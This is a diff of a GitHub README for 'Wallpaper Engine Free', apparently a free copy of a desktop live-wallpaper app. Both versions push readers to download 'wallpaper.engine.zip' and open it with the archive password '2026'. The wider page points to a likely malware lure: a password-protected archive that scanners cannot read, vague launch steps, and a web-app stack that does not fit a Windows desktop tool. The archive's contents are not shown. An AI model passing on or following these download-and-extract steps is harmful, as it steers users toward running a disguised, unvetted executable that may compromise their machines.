@@ -1,75 +1,159 @@
-# Wallpaper Engine Free 2026
+# Wallpaper Engine Free
 
+A desktop customization project focused on wallpapers and animated backgrounds.
 
-
-<p align="center">   <b>Live Wallpapers. More Atmosphere. For Free.</b>   <br>   Bring your desktop to life with beautiful animated backgrounds. </p>
- <img src="jaguar.jpg">
 <p align="center">
-  <a href="https://github.com/championkazekagemold/wallpaper-engine-free/releases/latest/download/wallpaper.engine.zip">
-    <img src="https://img.shields.io/badge/⬇_DOWNLOAD_NOW-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=008F3C" alt="Download Wallpaper Engine Free">
+  <a href="https://github.com/championkazekagemold/wallpaper-engine-free/releases/latest">
+    <img src="https://img.shields.io/badge/⬇_DOWNLOAD_NOW-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=008F3C" alt="Download Now">
   </a>
 </p>
 
 
+## Overview
 
-<p align="center">   <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows">   <img src="https://img.shields.io/badge/Open%20Source-Yes-brightgreen?style=for-the-badge">   <img src="https://img.shields.io/badge/Price-Free-purple?style=for-the-badge"> </p>
-<p align="center">Password: 2026</p>
+<img src="jaguar.jpg"></img>
 
-## ✨ About
+**Wallpaper Engine Free** is a desktop wallpaper project built around the idea of making desktop customization accessible and straightforward.
 
-**Wallpaper Engine Free** is a project focused on bringing beautiful live wallpapers and animated backgrounds to desktop users.
+It focuses on visual backgrounds, animated wallpapers, and a simple experience for users who want to change the look of their desktop.
 
-The goal is to provide an accessible wallpaper experience with a clean interface, customization options, and a growing collection of visual backgrounds.
+This repository contains the project source code and downloadable releases.
 
-## 🚀 Features
+## Features
 
-- 🎨 Beautiful desktop backgrounds
-- 🎬 Animated wallpaper support
-- ⚙️ Customization options
-- 🖥️ Desktop-focused experience
-- ⚡ Performance-conscious design
-- 🌌 Expanding wallpaper collection
-- 🆓 Free and open-source project
+- **Wallpaper customization** — personalize the appearance of your desktop.
+- **Animated backgrounds** — support for animated wallpaper experiences.
+- **Desktop-focused design** — created with desktop use in mind.
+- **Simple distribution** — downloadable release packages.
+- **Open-source codebase** — project source is available on GitHub.
 
+*The exact functionality may depend on the version included in the latest release.*
 
+## Download
 
-## 🛠️ Installation
+The recommended way to get the project is through GitHub Releases.
 
-1. Click the **Download** button above.
-2. Download the latest release.
-3. Follow the installation instructions.
-4. Launch the application.
+<p align="center">
+  <a href="https://github.com/championkazekagemold/wallpaper-engine-free/releases/latest/download/wallpaper.engine.zip">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20FREE-16A34A?style=for-the-badge&logo=windows&logoColor=white" alt="Download Wallpaper Engine Free">
+  </a>
+</p>
 
-## 🗺️ Roadmap
+1. Download `wallpaper.engine.zip`.
+2. Extract the archive.
+3. Enter the password when prompted.
+4. Follow the instructions included with the downloaded files.
 
-- [ ] Initial release
-- [ ] Wallpaper library
-- [ ] Animated backgrounds
-- [ ] Wallpaper customization
-- [ ] Performance optimization
-- [ ] Community contributions
+**Archive password:** `2026`
 
-## 🤝 Contributing
+[Browse all releases](https://github.com/championkazekagemold/wallpaper-engine-free/releases)
 
-Contributions are welcome!
+## ## Installation
 
-1. Fork the repository.
-2. Create a new branch.
-3. Make your changes.
-4. Submit a Pull Request.
+Installing Wallpaper Engine Free is simple. No development tools are required.
 
-## ⭐ Support
+### Step 1 — Download
 
-If you like this project, consider giving it a **star** ⭐
+Choose one of the following options:
 
-## 📄 License
+- Click the **Download** button in this README.
+- Or open [GitHub Releases](https://github.com/championkazekagemold/wallpaper-engine-free/releases) and download the `wallpaper.engine.zip` archive.
 
-See the `LICENSE` file for licensing information.
+### Step 2 — Extract the archive
+
+Once the download is complete, locate `wallpaper.engine.zip` on your computer and extract its contents.
+
+**Archive password:** `2026`
+
+### Step 3 — Launch
+
+Open the extracted folder and follow the included instructions to launch the application.
+
+That's it! You're ready to get started.
+
+## Technology Stack
+
+The project source uses the following technologies:
+
+| Technology | Purpose |
+|---|---|
+| React 19 | User interface |
+| Vite 8 | Development server and build tooling |
+| Tailwind CSS 4 | Styling |
+| JavaScript | Application logic |
+| ESLint | Code quality and linting |
+
+## Project Structure
+
+The repository includes the main application configuration and source-related files.
+
+```text
+wallpaper-engine-free/
+├── public/
+├── src/
+├── index.html
+├── package.json
+├── package-lock.json
+├── vite.config.js
+├── eslint.config.js
+└── README.md
+```
+
+*Note: The directory layout above is a simplified overview. Refer to the repository for the current file structure.*
+
+## Development
+
+The project uses standard npm scripts:
+
+| Command | Description |
+|---|---|
+| `npm run dev` | Start the local development server |
+| `npm run build` | Build the project for production |
+| `npm run preview` | Preview the production build |
+| `npm run lint` | Run ESLint |
+
+## Roadmap
+
+Planned areas of improvement:
+
+- [ ] Improve the wallpaper browsing experience.
+- [ ] Expand customization options.
+- [ ] Improve the interface and usability.
+- [ ] Refine performance and resource usage.
+- [ ] Improve installation and setup documentation.
+- [ ] Add more detailed documentation for contributors.
+
+## Contributing
+
+Contributions, suggestions, and bug reports are welcome.
+
+If you want to contribute:
+
+1. Fork this repository.
+2. Create a new branch for your changes.
+3. Make your changes and test them.
+4. Commit your work.
+5. Open a Pull Request with a description of the changes.
+
+For bug reports and feature suggestions, use [GitHub Issues](https://github.com/championkazekagemold/wallpaper-engine-free/issues).
+
+## Issues and Support
+
+If you encounter a problem:
+
+- Check the existing [Issues](https://github.com/championkazekagemold/wallpaper-engine-free/issues).
+- Open a new issue if the problem has not been reported.
+- Include the release version and steps to reproduce the issue.
+- Attach screenshots or error messages when relevant.
+
+Please avoid posting passwords, personal information, or other sensitive data in public issues.
+
+## License
+
+This project is licensed under the **MIT License**. See the [LICENSE](https://github.com/championkazekagemold/wallpaper-engine-free/blob/main/LICENSE) file for details.
 
 ---
 
 <p align="center">
-&#x20; Made with ❤️ for desktop customization.
-&#x20; <br>
-&#x20; <b>Make your desktop alive. ✨\</b>
+  <sub>Wallpaper Engine Free · Open-source desktop customization project</sub>
 </p>
